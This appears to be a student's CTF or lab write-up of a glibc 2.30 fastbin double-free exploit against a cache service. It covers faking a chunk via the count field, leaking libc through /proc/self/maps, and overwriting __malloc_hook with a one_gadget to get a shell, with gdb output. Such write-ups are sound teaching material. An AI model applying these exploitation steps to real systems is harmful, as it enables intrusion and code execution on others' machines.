## Use of AI

1. Used AI to set up the docker env, as well as the script that connects & runs gdb
2. Using AI for consultations when I dont understand something, and to help find the gadgets suitable for shell hijacking.

## Thinking process

After reading the source code, we can make a few observations:

1.`void execute_command()` allows reading files with the CONFIG command, which dumps any requested file assuming `cache.permissive_mode` is set - this sets a target as writing on top of the said field.

2. `cmd_del` frees the value but never checks if the value has already been deleted. which allows us to double-free.

3. The binary is linked with `--no-pie`, so we have fixed addresses.

4. Every chunk is allocated with a fixed requested size of 90, which after req2size results into chunks of size 0x70, so we know that all of them are fastbin chunks

This already hints that the double-free exploit we studied at labs can be used. One crucial detail that is required for the exploit to work - the target address needs to look like a valid chunk, which brings us to the next observation

5.

```
cache_state_t cache = {
  .count = 0,
  .permissive_mode = false,
  .total_gets = 0,
  .total_sets = 0,
  .total_dels = 0
};
```

The count field is fully controlled by us (set / del increases / decreases the count), by adding/removing cache elements. therefore, we can change the count to make it look like a valid fastbin chunk size, and because its stored 8 bytes before the permissive mode, if we look at address &cache.permissive_mode - 0x10, it looks like a valid chunk, assuming count is set to 0x70-07f

This works because:
\[AI\]the provided glibc (a custom 2.30 built without tcache) sends freed chunks straight to the fastbin, and its fastbin path doesn't check 16-byte chunk alignment, so the fake chunk at `P` is accepted even though it isn't aligned.

So putting all of the observations together:
We want malloc to return a chunk that contains permissive_mode in its writing space, by utilizing the double free fastbin exploit.

## Exploit

First, need to collect the address of the permissive_mode. in gdb,

```
gef➤  x &cache.permissive_mode
0x406c48 <cache+7176>:        0x00000000
```

When it comes to the actual exploit action sequence (`P = &cache.permissive_mode - 0x10` is the fake chunk):

1. create 0x70 dummies to increase the count, therefore when we can be sure that the size matches the fastbin chunk size (at the end of the exploit)
2. create item a

3. create item b

4. delete a
   the freed fastbin chunks are stored as a linked list, with each chunk having a pointer to the next freed chunk(fd), to optimise malloc. This was entirely explained in labs.
   The state of the chain:

   - head => a

5. delete b

   - head => b => a
     we delete b in between the double free to avoid the double free check by glibc.

6. delete a

   - head => a => b => a

7. create (gives back a) an element and set its contents as P= &cache.permissive-0x10 (for prev_size and size fields). The fd pointer is the first 8 usable bytes of a chunk, which is why P replaces the pointer to the next chunk.

   - head => b => a => P

8. create some element

   - head => a => P

9. create some element

   - head => P

10. create an element that with contents \x01, we get P and the contents are written onto P + 0x10 which is exactly the permissive mode flag.

11. run the config dump command CONFIG /home/ctf/flag.txt

```
════════════════════════════════════════════════
   1 | Thanks hacker, but the flag is in another castle!
   2 | Try to put to good use what you learned in lesson 0x09,
   3 | 'Other useful concepts/tools'
════════════════════════════════════════════════
```

It seems that instead we would need to hijack a shell.
One of the standard ways that was presented in the labs was utilizing the malloc/free hooks. What we want to accomplish is setting the free hook as `system`, and then freeing a chunk that has /bin/sh as its contents.

While we're not able to leak the flag itself, the config dump command is still useful - we can dump /proc/self/maps to know the libc offset.

12. run CONFIG /proc/self/maps, which leaks the libc base: e.g. libc_base = 0x7fffff21c000

13. find a suitable gadget: we would first like to try either mallock hook or free hook. but need to check if either is reachable, which depends on wether there is a fastbin-chunk-looking piece of memory around - reliable, but not guaranteed to work:
    The offset from the base of libc is known:

- \_\_malloc_hook = libc_base + 0x3b4b50
- \_\_free_hook = libc_base + 0x3b6e20

The free_hook cannot be reached due to there being no siutable data around it that looks like a valid fastbin chunk size.

Inspect malloc hook first with gdb at the moment of exploit - initially used AI for this, then verified:

```

pwndbg> x/32gx (char*)&__free_hook - 0x70
0x7f87cedb6db0 <fork_handlers+1456>:      0x0000000000000000   0x0000000000000000
0x7f87cedb6dc0 <fork_handlers+1472>:      0x0000000000000000   0x0000000000000000
0x7f87cedb6dd0 <fork_handlers+1488>:      0x0000000000000000   0x0000000000000000
0x7f87cedb6de0 <fork_handlers+1504>:      0x0000000000000000   0x0000000000000000
0x7f87cedb6df0 <fork_handlers+1520>:      0x0000000000000000   0x0000000000000000
0x7f87cedb6e00 <fork_handlers+1536>:      0x0000000000000000   0x0000000000000000
0x7f87cedb6e10 <fork_handlers+1552>:      0x0000000000000000   0x0000000000000000
0x7f87cedb6e20 <__free_hook>:             0x0000000000000000   0x0000000000000000
0x7f87cedb6e30 <next_to_use.11672>:       0x0000000000000000   0x0000000000000000
0x7f87cedb6e40 <using_malloc_checking>:   0x0000000000000000   0x0000000000000000
0x7f87cedb6e50 <list_lock>:               0x0000000000000000   0x0000000000000000
0x7f87cedb6e60 <free_list_lock>:          0x0000000000000000   0x0000000000000000
0x7f87cedb6e70 <dumped_main_arena_start>: 0x0000000000000000   0x0000000000000080
0x7f87cedb6e80 <pedantic>:                0x0000000000000000   0x0000000000000000
0x7f87cedb6e90 <abortfunc>:               0x0000000000000000   0x0000000000000000
0x7f87cedb6ea0 <old_memalign_hook>:       0x0000000000000000   0x0000000000000000

pwndbg> x/32gx (char*)&__malloc_hook - 0x70
0x7f87cedb4ae0 <_IO_wide_data_0+160>:     0x0000000000000000   0x0000000000000000
0x7f87cedb4af0 <_IO_wide_data_0+176>:     0x0000000000000000   0x0000000000000000
0x7f87cedb4b00 <_IO_wide_data_0+192>:     0x0000000000000000   0x0000000000000000
0x7f87cedb4b10 <_IO_wide_data_0+208>:     0x0000000000000000   0x0000000000000000
0x7f87cedb4b20 <_IO_wide_data_0+224>:     0x0000000000000000   0x0000000000000000
0x7f87cedb4b30 <_IO_wide_data_0+240>:     0x00007f87cedb0ee0   0x0000000000000000
0x7f87cedb4b40 <__memalign_hook>:         0x00007f87cea83a10   0x00007f87cea83ed0
0x7f87cedb4b50 <__malloc_hook>:           0x0000000000000000   0x0000000000000000
0x7f87cedb4b60 <main_arena>:              0x0000000000000000   0x0000000000000001
0x7f87cedb4b70 <main_arena+16>:           0x0000000000000000   0x0000000000000000
0x7f87cedb4b80 <main_arena+32>:           0x0000000000000000   0x0000000000000000
0x7f87cedb4b90 <main_arena+48>:           0x0000000000000000   0x0000000000000000
0x7f87cedb4ba0 <main_arena+64>:           0x0000000000000000   0x0000000000000000
0x7f87cedb4bb0 <main_arena+80>:           0x0000000000000000   0x0000000000000000
0x7f87cedb4bc0 <main_arena+96>:           0x000000003d45a1e0   0x0000000000000000
0x7f87cedb4bd0 <main_arena+112>:          0x00007f87cedb4bc0   0x00007f87cedb4bc0

pwndbg> x/4gx (char*)&__malloc_hook - 0x23
0x7f87cedb4b2d <_IO_wide_data_0+237>:     0x87cedb0ee0000000   0x000000000000007f
0x7f87cedb4b3d:                           0x87cea83a10000000   0x87cea83ed000007f
```

So the malloc hook is the only one where we can imitate a fastbin chunk.

We then find the address that can be written on top of malloc_hook to give us a shell (done with ai as well). Malloc hook is called as hook(size, caller) so if we just put the address of system, we will call system(size) - so we need to find a gadget that does execve(/bin/sh) on its own, and make sure that all its preconditions hold.

AI found four candidates:

```
  ▎ 0xc4dbf  execve("/bin/sh", r13, r12)          #
  ▎ needs r13,r12 = NULL / valid argv,envp
  ▎ 0xc4ddf  execve("/bin/sh", rbp-0x40, r12)     #
  ▎ needs rbp-0x38 writable, rdi NULL-ish, r12 envp
  ▎ 0xc4de6  execve("/bin/sh", rbp-0x40, r12)     #
  ▎ needs rbp-0x38 writable, rax NULL-ish, r12 envp
  ▎ 0xe1fa1  execve("/bin/sh", rsp+0x50, environ) #
  ▎ needs [rsp+0x50] == NULL

```

we break inside mallock to check if the preconditions hold.

```
pwndbg> i r
rax            0x7f91ff4e1fa1      140265030295457
rbx            0x0                 0
rcx            0xffffffff          4294967295
rdx            0x0                 0
rsi            0x4017f1            4200433
rdi            0x5a                90
rbp            0x7ffdde0f04e0      0x7ffdde0f04e0
rsp            0x7ffdde0f04a8      0x7ffdde0f04a8
r8             0x19                25
r9             0x0                 0
r10            0x7ffdde0edcc8      140728328969416
r11            0x246               582
r12            0x4012e0            4199136
r13            0x7ffdde0f0800      140728328980480
r14            0x0                 0
r15            0x0                 0
rip            0x7f91ff4e1fa1      0x7f91ff4e1fa1 <exec_comm+1761>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7f91ffa7f540      140265036182848
gs_base        0x0                 0
pwndbg> x/gx $rsp+0x50
0x7ffdde0f00f0:       0x0000000000000000
```

the preconditions only hold for 0xe1fa1:
non null r12, r13 , rdi rax - but rsp condition holds

the preconditions are satisfied, and we can use:
gadget = libc_base + 0xe1fa1

14. perform the double free the same way as before (although we dont try to change the count ourselves), but with target `_\_malloc_hook - 0x23`, so that the usable space starts at `__mallock_hook - 0x13`, write 0x13 nonzero bytes + p64(gadget), so the gadget address lands exactly on mallock hook.

15. run SET which trigers malloc, and gives us a shell

16. look for the flag on the server, its found in /flags/\*-flag.txt
